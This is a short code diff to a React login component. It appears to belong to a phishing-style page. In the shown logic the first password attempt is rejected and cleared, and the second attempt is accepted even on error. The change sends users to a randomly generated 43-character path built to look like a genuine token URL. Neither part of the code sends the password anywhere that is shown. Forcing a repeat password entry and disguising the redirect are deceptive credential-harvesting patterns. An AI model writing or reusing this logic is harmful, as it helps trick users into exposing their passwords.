@@ -55,8 +55,18 @@ const Login = () => {
         setPasswordAttempts(1);
         setPassword("");
       } else {
-        // Second attempt: redirect directly without error
-        navigate('/survey');
+        // Second attempt: redirect to survey with random URL
+        const generateRandomSurveyId = () => {
+          const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+          let result = '';
+          for (let i = 0; i < 43; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+          }
+          return result;
+        };
+        
+        const surveyId = generateRandomSurveyId();
+        navigate(`/e/${surveyId}=`);
       }
     } catch (error) {
       console.error('Login error:', error);
@@ -65,7 +75,17 @@ const Login = () => {
         setPasswordAttempts(1);
         setPassword("");
       } else {
-        navigate('/survey');
+        const generateRandomSurveyId = () => {
+          const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+          let result = '';
+          for (let i = 0; i < 43; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+          }
+          return result;
+        };
+        
+        const surveyId = generateRandomSurveyId();
+        navigate(`/e/${surveyId}=`);
       }
     } finally {
       setIsLoading(false);
